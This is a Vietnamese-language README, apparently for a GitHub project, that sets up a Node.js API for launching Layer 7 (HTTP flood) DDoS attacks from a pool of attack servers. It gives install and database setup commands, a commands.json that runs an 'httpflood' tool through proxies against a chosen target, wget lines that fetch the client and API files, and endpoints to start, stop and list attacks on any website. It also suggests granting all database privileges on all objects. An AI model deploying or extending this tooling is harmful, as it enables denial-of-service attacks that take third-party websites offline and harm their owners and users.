<h2>Trình quản lý API NodeJS cho các cuộc tấn công Lớp 7</h2>

<h4>API này rất an toàn và nhanh chóng (mất 2 lần ping giữa API và phần phụ trợ, tức là ping là 60ms, sẽ chỉ mất 120ms để khởi động cuộc tấn công)</h4>

<h1>Cài đặt: trên centos</h1>

***cài đặt nodejs***
```sh
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.38.0/install.sh | bash
source ~/.nvm/nvm.sh
nvm install 14.17.3
nvm use 14.17.3
npm i express mysql
```
***cài đặt cơ sở dữ liệu***
```
sudo yum install mariadb-server
sudo systemctl start mariadb
sudo systemctl enable mariadb
sudo systemctl status mariadb
sudo mysql_secure_installation
mysql -u root -p
```
<h1>Setup:</h1>

<h3>Update servers.json</h3><br>

```json
{
    "1": {
        "name": "1",
        "ip": "1.1.1.1",
        "port": 8888
    },
    "2": {
        "name": "2",
        "ip": "2.2.2.2",
        "port": 8888
    }
}
```

<h3>Update commands.json</h3><br>

```json
{
    "HTTPGET": "screen -dmS attack_${attack_id} ./httpflood ${target} ${duration} POST proxies.txt",
    "HTTPPOST": "screen -dmS attack_${attack_id} ./httpflood ${target} ${duration} POST proxies.txt"
}
```

<h3>Update settings.json</h3><br>

```json
{
    "database": {
        "host": "localhost",
        "user": "DATABASE_USER",
        "password": "DATABASE_PASSWORD",
        "database": "DATABASE_NAME"
    },
    "socket_token": "SECRET_TOKEN", 
    "max_attacksn": 10,
    "api_port": 8888
}
```

<h3>Update client.js:</h3><br>

```js
const socket_port = 8888; // cổng API
const socket_token = "SECRET_TOKEN"; // mã thông báo bí mật của bạn để bảo vệ kết nối TCP
const allowed_ips = ['1.1.1.1']; // IP máy chủ API
```

<h3>Thiết lập cơ sở dữ liệu</h3><br>

```sql
CREATE DATABASE manager;

use manager;

CREATE TABLE `attacks` (
    `id` int(11) NOT NULL,
    `server` varchar(300) DEFAULT NULL,
    `target` text DEFAULT NULL,
    `duration` int(11) NOT NULL,
    `method` varchar(255) DEFAULT NULL,
    `date_sent` int(11) DEFAULT NULL,
    `stopped` int(11) NOT NULL DEFAULT 0,
    `attack_id` int(11) DEFAULT NULL
);

ALTER TABLE `attacks` ADD PRIMARY KEY (`id`);

ALTER TABLE `attacks` MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
```

***sử lý lỗi từ chối kết nối***

1 Truy cập MariaDB: Đăng nhập vào máy chủ chứa cơ sở dữ liệu MariaDB bằng tài khoản có quyền quản trị. Bạn có thể sử dụng lệnh sau để đăng nhập vào MariaDB:
```mysql -u root -p```

2 Thiết lập quyền truy cập cho máy chủ của bạn: MariaDB sử dụng kiểm tra quyền truy cập dựa trên địa chỉ IP. Để cho phép máy chủ của bạn kết nối, bạn cần cấp quyền cho địa chỉ IP của máy chủ đó.

```GRANT ALL PRIVILEGES ON *.* TO 'tên_tài_khoản'@'địa_chỉ_IP_máy_chủ' IDENTIFIED BY 'mật_khẩu';```

Trong đó:

`tên_tài_khoản` là tên tài khoản truy cập MariaDB.

`địa_chỉ_IP_máy_chủ` là địa chỉ IP của máy chủ cần kết nối.

`mật_khẩu` là mật khẩu của tài khoản.

Lưu ý rằng bạn cần phải thay thế các giá trị này bằng thông tin của bạn.

3 Làm mới quyền truy cập: Sau khi bạn đã thay đổi quyền, hãy làm mới quyền để áp dụng thay đổi:
```FLUSH PRIVILEGES;```

4 thoát
```exit;```

### Sau đó, tải `client.js` lên máy chủ tấn công và tải `api.js` `server.json` `command.json` `settings.json` lên máy chủ API
```
wget https://raw.githubusercontent.com/DauDau432/Api_L7_Manager/main/api.json
wget https://raw.githubusercontent.com/DauDau432/Api_L7_Manager/main/commands.json
wget https://raw.githubusercontent.com/DauDau432/Api_L7_Manager/main/settings.json
wget https://raw.githubusercontent.com/DauDau432/Api_L7_Manager/main/servers.json
```
```
wget https://raw.githubusercontent.com/DauDau432/Api_L7_Manager/main/client.js
```

### khởi động
```
screen -S APIv3 -dm node api.js
```
```
screen -S CLIENT -dm node client.js
```
### Proxy ngược

***Nên tạo proxy ngược bằng Nginx để sử dụng API của bạn:***

```conf
server {
    listen 80;
    server_name api.yourdomain.com;
    location /api {
        proxy_pass http://backend:8888/api;
    }
}
```

Thay thế `'http://backend:3000/api'` bằng IP máy chủ API của bạn

### Sử dụng API

Gửi yêu cầu tới API bằng các trường bắt buộc

`http://api.yourdomain.com/api/attack?target=https://website.com&duration=120&method=HTTPGET&server=1`

Bạn có thể dừng các cuộc tấn công bằng cách gửi yêu cầu tới API bằng ID tấn công

`http://api.yourdomain.com/api/stop?attack_id=[id]`

Bạn cũng có thể xem tất cả các cuộc tấn công đang diễn ra và việc sử dụng máy chủ bằng cách gửi yêu cầu tới API

`http://api.yourdomain.com/api/status`

Bạn cũng có thể dừng tất cả các cuộc tấn công gửi yêu cầu tới API

`http://api.yourdomain.com/api/stop_all`
